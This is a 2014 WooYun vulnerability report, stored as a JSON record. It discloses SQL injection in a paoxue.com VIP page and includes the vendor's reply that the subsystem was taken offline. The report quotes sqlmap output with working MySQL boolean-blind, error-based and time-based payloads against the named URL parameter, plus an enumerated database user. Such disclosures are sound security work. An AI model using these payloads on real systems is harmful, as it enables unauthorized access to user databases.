{"id": 52726, "wybug_id": "wooyun-2014-070344", "wybug_title": "泡学网存在SQL注入漏洞VIP用户资料泄露", "wybug_corp": "paoxue.com", "wybug_author": "mapleeve", "wybug_date": "2014-08-03 15:58", "wybug_open_date": "2014-08-03 16:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-03：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 其实我也是一个PUA，你有妹子了么 详细说明：  注入点: \nhttp://paoxue.com/vip/trail.php?uid=-1 (GET)\n\n\n   漏洞证明：  \n\n\n\n\nsqlmap identified the following injection points with a total of 10660 HTTP(s) requests:---Place: GETParameter: uid    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: uid=-1 RLIKE (SELECT (CASE WHEN (5516=5516) THEN 0x2d31 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause    Payload: uid=-8844 OR ROW(8651,6276)>(SELECT COUNT(*),CONCAT(0x7169747671,(SELECT (CASE WHEN (8651=8651) THEN 1 ELSE 0 END)),0x716c706a71,FLOOR(RAND(0)*2))x FROM (SELECT 1076 UNION SELECT 8937 UNION SELECT 5275 UNION SELECT 8627)a GROUP BY x)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: uid=-5855 OR 8895=SLEEP(5)---web application technology: PHP 5.3.3back-end DBMS: MySQL 4.1sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: uid    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: uid=-1 RLIKE (SELECT (CASE WHEN (5516=5516) THEN 0x2d31 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause    Payload: uid=-8844 OR ROW(8651,6276)>(SELECT COUNT(*),CONCAT(0x7169747671,(SELECT (CASE WHEN (8651=8651) THEN 1 ELSE 0 END)),0x716c706a71,FLOOR(RAND(0)*2))x FROM (SELECT 1076 UNION SELECT 8937 UNION SELECT 5275 UNION SELECT 8627)a GROUP BY x)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: uid=-5855 OR 8895=SLEEP(5)---web application technology: PHP 5.3.3back-end DBMS: MySQL >= 5.0.0database management system users [1]:[*] 'crm'@'%'\n   修复方案：  添加过滤   版权声明：转载请注明来源 mapleeve@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-08-03 16:07 厂商回复： 经核实该漏洞确实存在，属于已废弃的子系统尚遗留在生产环境未做下线处理导致。因为生产环境前端已经部署WAF，实际上受影响范围有限，大部分危险查询已被拦截，所以最后折中考虑给RANK 8。 感谢您的泡学网信息安全做出的贡献，我们也会对研发团队加强安全相关的培训。 稍后有小礼物送上。 最新状态： 2014-08-03：已在生产环境完成下线处理。再次感谢  ", "replys": "漏洞评价：\n评论\n     2014-08-03 16:36 |    \t\tmapleeve \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 枫林晚矣)\t\t \n  泡学加油，看好你们哦    \n     2014-08-04 10:21 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  @泡学网 我给你们继续挖个洞给礼物不……    \n     2014-08-05 11:38 |    \t\t泡学网(乌云厂商)\t\t \n  @Ev1l 挖漏洞送妹子。。。。啊不对，是送追妹子的方法:)    \n     2014-08-05 11:43 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  @泡学网 我刚才给你们提交了一个洞洞，有一些问题和你交流，能否私信一个联系方式呢？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}